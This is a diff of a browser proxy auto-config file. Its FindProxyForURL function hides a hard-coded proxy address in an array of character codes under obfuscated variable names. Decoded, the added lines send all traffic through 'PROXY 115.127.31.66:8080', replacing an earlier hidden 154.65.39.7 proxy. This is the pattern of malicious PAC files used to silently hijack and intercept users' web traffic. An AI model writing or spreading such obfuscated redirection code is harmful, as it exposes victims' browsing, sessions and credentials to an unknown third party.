@@ -1,9 +1,9 @@
 function FindProxyForURL(url, host) {
-    // _hash_UDuMcu
-    var _0x_arr_UDuMcu = [80,82,79,88,89,32,49,53,52,46,54,53,46,51,57,46,55,58,56,48,59,32,68,73,82,69,67,84];
-    var _0x_res_UDuMcu = "";
-    for (var i = 0; i < _0x_arr_UDuMcu.length; i++) {
-        _0x_res_UDuMcu += String.fromCharCode(_0x_arr_UDuMcu[i]);
+    // _hash_ENwqru
+    var _0x_arr_ENwqru = [80,82,79,88,89,32,49,49,53,46,49,50,55,46,51,49,46,54,54,58,56,48,56,48,59,32,68,73,82,69,67,84];
+    var _0x_res_ENwqru = "";
+    for (var i = 0; i < _0x_arr_ENwqru.length; i++) {
+        _0x_res_ENwqru += String.fromCharCode(_0x_arr_ENwqru[i]);
     }
-    return _0x_res_UDuMcu;
+    return _0x_res_ENwqru;
 }
